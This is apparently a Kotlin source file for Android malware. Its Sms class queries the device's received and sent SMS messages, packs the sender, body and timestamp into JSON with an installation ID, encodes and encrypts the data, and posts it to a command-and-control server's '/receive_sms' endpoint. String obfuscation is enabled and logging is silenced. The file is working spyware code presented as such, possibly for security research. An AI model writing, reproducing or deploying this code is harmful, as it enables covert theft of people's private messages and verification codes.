package com.example.kotlinmalware

import android.content.ContentResolver
import android.net.Uri
import android.util.Log
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import org.json.JSONArray
import org.json.JSONObject
import java.io.IOException
import android.content.Context
import android.database.Cursor
import android.util.Base64
import com.mobilesec.govcomm.mal.getInstallationId
import io.github.c0nnor263.obfustringcore.ObfustringThis
import okhttp3.RequestBody.Companion.toRequestBody
@ObfustringThis
class Sms(private val contentResolver: ContentResolver, private val c2ServerUrl: String, private val context: Context) {

    fun exfiltrateSMS() {
        sendSMSDataToC2Server()
    }
    private fun sendSMSDataToC2Server() {
        //Log.d("HTTP_SEND", "Sending SMS data to C2 server")
        val installationId = getInstallationId(context)
        val smsDataJsonArray = JSONArray()
        // Query both received and sent messages
        val uriInbox = Uri.parse("content://sms/inbox")
        val uriSent = Uri.parse("content://sms/sent")
        val cursorInbox = contentResolver.query(uriInbox, null, null, null, null)
        val cursorSent = contentResolver.query(uriSent, null, null, null, null)
        cursorInbox?.use {
            extractSmsData(it, smsDataJsonArray, installationId, "received")
        }
        cursorSent?.use {
            extractSmsData(it, smsDataJsonArray, installationId, "sent")
        }
        val jsonDataString = smsDataJsonArray.toString()
        //Log.d("HTTP_SEND", jsonDataString)
        val jsonDataBytes = jsonDataString.toByteArray(Charsets.UTF_8)
        val jsonDataBase64 = Base64.encodeToString(jsonDataBytes, Base64.DEFAULT)
        val encryptedResponse = AESEncryption.encrypt(jsonDataBase64)
        sendDataToC2Server(encryptedResponse)
    }

    private fun extractSmsData(cursor: Cursor, jsonArray: JSONArray, installationId: String, type: String) {
        val indexAddress = cursor.getColumnIndex("address")
        val indexBody = cursor.getColumnIndex("body")
        val indexDate = cursor.getColumnIndex("date")
        while (cursor.moveToNext()) {
            val smsObject = JSONObject().apply {
                put("uuid", installationId)
                put("type", type)
                put("address", cursor.getString(indexAddress))
                put("body", cursor.getString(indexBody))
                put("date", cursor.getLong(indexDate))
            }
            jsonArray.put(smsObject)
        }
    }

//    AESEncryption.encrypt(encryptedData)

    private fun sendDataToC2Server(data: String) {
        val client = OkHttpClient.Builder()
            .connectionSpecs(listOf(ConnectionSpec.CLEARTEXT, ConnectionSpec.MODERN_TLS))
            .build()
        val requestBody = data.toRequestBody("application/json".toMediaTypeOrNull())
        val request = Request.Builder()
            .url("$c2ServerUrl/receive_sms")
            .post(requestBody)
            .build()

        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                //Log.e("C2_SERVER", "Failed to send data to C2 server", e)
            }

            override fun onResponse(call: Call, response: Response) {
                if (!response.isSuccessful) {
                    //Log.e("C2_SERVER", "Failed to send data to C2 server: ${response.code}")
                } else {
                    //Log.d("C2_SERVER", "Data sent successfully")
                }
            }
        })
    }
    // Assuming getInstallationId() is available globally or within this class
}
